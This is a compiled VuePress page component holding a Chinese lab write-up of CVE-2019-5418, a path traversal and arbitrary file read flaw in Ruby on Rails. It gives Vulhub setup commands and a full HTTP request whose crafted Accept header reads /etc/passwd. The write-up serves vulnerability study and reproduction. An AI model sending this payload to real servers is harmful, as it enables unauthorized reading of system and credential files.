import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as s,c as r,a as e,b as n,d as i,e as c}from"./app-58e4a7d6.js";const d={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),p=e("p",null,[n("在控制器中通过"),e("code",null,"render file"),n("形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入"),e("code",null,"Accept: ../../../../../../../../etc/passwd{{"),n("头来构成构造路径穿越漏洞，读取任意文件。")],-1),u=e("p",null,"参考链接：",-1),_={href:"https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q",target:"_blank",rel:"noopener noreferrer"},h={href:"https://xz.aliyun.com/t/4448",target:"_blank",rel:"noopener noreferrer"},m=c(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令编译及启动Rail On Rails 5.2.2：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:3000</code>即可看到Ruby on Rails的欢迎页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281921260.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问<code>http://your-ip:3000/robots</code>可见，正常的robots.txt文件被读取出来。</p><p>利用漏洞，发送如下数据包，读取<code>/etc/passwd</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /robots HTTP/1.1
Host: your-ip:3000
Accept-Encoding: gzip, deflate
Accept: ../../../../../../../../etc/passwd{{
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功读取<code>/etc/passwd</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281923976.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11);function b(g,v){const a=o("ExternalLinkIcon");return s(),r("div",null,[l,p,u,e("ul",null,[e("li",null,[e("a",_,[n("https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q"),i(a)])]),e("li",null,[e("a",h,[n("https://xz.aliyun.com/t/4448"),i(a)])])]),m])}const y=t(d,[["render",b],["__file","Ruby On Rails 路径穿越与任意文件读取漏洞 CVE-2019-5418.html.vue"]]);export{y as default};
